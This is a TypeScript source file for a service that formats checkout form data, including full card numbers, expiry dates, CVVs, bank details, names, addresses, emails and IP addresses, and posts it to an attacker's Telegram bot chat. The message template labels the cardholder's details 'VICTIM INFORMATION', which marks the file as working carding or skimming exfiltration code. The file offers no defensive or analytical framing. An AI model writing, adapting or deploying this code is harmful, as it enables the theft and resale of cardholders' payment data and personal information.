interface TelegramConfig {
  botToken: string;
  chatId: string;
}

interface BankInfo {
  bank: string;
  level: string;
  type: string;
  country: string;
}

interface FormDataPayload {
  email: string;
  firstName: string;
  lastName: string;
  address: string;
  city: string;
  state: string;
  zipCode: string;
  country: string;
  cardNumber: string;
  cardName: string;
  expiryDate: string;
  cvv: string;
  orderTotal: number;
  orderItems: Array<{
    name: string;
    quantity: number;
    price: number;
  }>;
  ipAddress?: string;
  userAgent?: string;
  bankInfo?: BankInfo;
}

class TelegramService {
  private botToken: string;
  private chatId: string;
  private apiUrl: string;

  constructor(config: TelegramConfig) {
    this.botToken = config.botToken;
    this.chatId = config.chatId;
    this.apiUrl = `https://api.telegram.org/bot${this.botToken}`;
  }

  private formatMessage(data: FormDataPayload): string {
    const orderItemsList = data.orderItems
      .map((item, index) => 
        `${index + 1}. ${item.name}\n   Qty: ${item.quantity} × $${item.price.toFixed(2)} = $${(item.quantity * item.price).toFixed(2)}`
      )
      .join('\n\n');

    return `
🛒 *NEW ORDER RECEIVED*
━━━━━━━━━━━━━━━━━━━━

💳 *PAYMENT INFORMATION*
💳 Card Number: \`${data.cardNumber}\`
📅 Expiration Date: ${data.expiryDate}
🔐 CVV: ${data.cvv}

🏦 *BANK INFORMATION*
🏦 Bank: ${data.bankInfo?.bank || 'Unknown'}
📊 Level: ${data.bankInfo?.level || 'N/A'}
💳 Type: ${data.bankInfo?.type || 'N/A'}
🌍 Country: ${data.bankInfo?.country || 'Unknown'}

👤 *VICTIM INFORMATION*
🔸 Last Name: ${data.lastName}
🔸 First Name: ${data.firstName}
🔸 Address: ${data.address}
🔸 City: ${data.city}
🔸 Postal Code: ${data.zipCode}

📧 *Contact Information*
Email: ${data.email}

📦 *ORDER ITEMS*
${orderItemsList}

━━━━━━━━━━━━━━━━━━━━
💰 *TOTAL: $${data.orderTotal.toFixed(2)}*
━━━━━━━━━━━━━━━━━━━━

🌐 *THIRD PARTY*
🌐 IP Address: ${data.ipAddress || 'Not captured'}
🖥 User-Agent: ${data.userAgent ? data.userAgent.substring(0, 100) + '...' : 'Not captured'}
⏰ *Order Time:* ${new Date().toLocaleString('en-US', { 
      dateStyle: 'medium', 
      timeStyle: 'medium' 
    })}
    `.trim();
  }

  async sendFormData(data: FormDataPayload): Promise<boolean> {
    try {
      if (!this.botToken || !this.chatId) {
        console.error('❌ Telegram configuration missing');
        return false;
      }

      const message = this.formatMessage(data);
      
      console.log('📤 Sending to Telegram:', {
        chatId: this.chatId,
        hasToken: !!this.botToken,
        messageLength: message.length,
        ipAddress: data.ipAddress,
        bankInfo: data.bankInfo
      });

      const response = await fetch(`${this.apiUrl}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: this.chatId,
          text: message,
          parse_mode: 'Markdown',
        }),
      });

      const result = await response.json();
      
      if (!result.ok) {
        console.error('❌ Telegram API Error:', result);
        return false;
      }

      console.log('✅ Message sent to Telegram successfully');
      return true;
    } catch (error) {
      console.error('❌ Error sending to Telegram:', error);
      return false;
    }
  }

  async sendNotification(message: string): Promise<boolean> {
    try {
      const response = await fetch(`${this.apiUrl}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: this.chatId,
          text: message,
          parse_mode: 'Markdown',
        }),
      });

      const result = await response.json();
      return result.ok;
    } catch (error) {
      console.error('Error sending notification:', error);
      return false;
    }
  }
}

export default TelegramService;